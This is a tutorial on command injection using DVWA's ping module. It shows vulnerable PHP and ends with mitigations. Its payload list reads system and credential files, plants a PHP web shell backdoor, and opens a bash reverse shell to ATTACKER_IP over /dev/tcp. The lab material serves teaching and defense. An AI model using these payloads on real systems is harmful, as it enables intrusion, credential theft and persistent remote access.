Command Injection


🔍 What Is It?

Command Injection is a vulnerability where an attacker can execute arbitrary operating system commands on the server by injecting shell metacharacters into application input that is passed to a system shell function. It is one of the most severe vulnerabilities because it provides direct access to the underlying OS.


⚙️ How It Works in DVWA

DVWA's Command Injection module asks for an IP address to ping. The backend code does something like:
php// Vulnerable code
$output = shell_exec('ping -c 4 ' . $_POST['ip']);
If the user enters 127.0.0.1, the command is:
bashping -c 4 127.0.0.1
But an attacker can chain additional commands using shell operators.


💥 Exploitation

Shell Metacharacters
OperatorBehaviorExample;Run commands sequentially127.0.0.1; whoami&&Run second if first succeeds127.0.0.1 && id||Run second if first failsinvalid || whoami|Pipe output127.0.0.1 | ls`Command substitution127.0.0.1; `id`$()Command substitution127.0.0.1; $(id)
Practical Payloads
bash# Identify the user
127.0.0.1; whoami

# Read sensitive files
127.0.0.1; cat /etc/passwd

# List web root
127.0.0.1; ls -la /var/www/html

# Read DVWA config (database credentials)
127.0.0.1; cat /var/www/html/dvwa/config/config.inc.php

# Create a backdoor
127.0.0.1; echo '<?php system($_GET["c"]); ?>' > /var/www/html/backdoor.php

# Reverse shell
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
Windows Payloads
cmd127.0.0.1 & whoami
127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts
127.0.0.1 | dir C:\


🔐 Mitigation


MethodDescriptionAvoid Shell FunctionsNever use system(), exec(), shell_exec(), passthru() with user inputUse Safe APIsUse language-native network functions instead of shelling outInput ValidationWhitelist only valid IP address format (regex)escapeshellarg()Wraps input in single quotes and escapes special charactersLeast PrivilegeWeb server process should not run as root
php// ✅ Safe - escapeshellarg + whitelist
if (!filter_var($_POST['ip'], FILTER_VALIDATE_IP)) {
    die("Invalid IP address.");
}
$output = shell_exec('ping -c 4 ' . escapeshellarg($_POST['ip']));
